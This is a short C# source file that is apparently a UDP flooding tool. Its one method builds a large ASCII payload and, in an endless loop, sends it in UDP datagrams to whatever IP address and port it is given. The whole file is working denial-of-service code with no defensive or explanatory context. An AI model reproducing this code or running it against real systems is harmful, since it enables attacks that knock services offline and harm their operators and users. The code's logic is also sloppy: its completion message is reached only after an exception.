using System;
using System.Net;
using System.Net.Sockets;

namespace PacketSender
{
    class PacketUtils
    {
        public static void sendPackets(String ip, int port, double packets)
        {

            String alph = "ABCDEFGHIJKLMNOABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            String allData = "";

            for (int i = 0; i < 500; i++)
            {
                allData = allData + alph;
            }

            try
            {
                while (true)
                {
                    for (int i = 0; i < packets; i++)
                    {
                        byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(allData);
                        IPEndPoint location = new IPEndPoint(IPAddress.Parse(ip), port);
                        Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        client.SendTimeout = 1;

                        client.SendTo(packetData, location);
                    }
                }
            }
            catch (SystemException)
            {
                Console.WriteLine("\n" + "You sent too many packets. (Internet cant handle it.)");
                Console.ReadLine();
            }

            Console.WriteLine($"Sent {packets} packets to {ip} on {port}.");
        }
    }
}
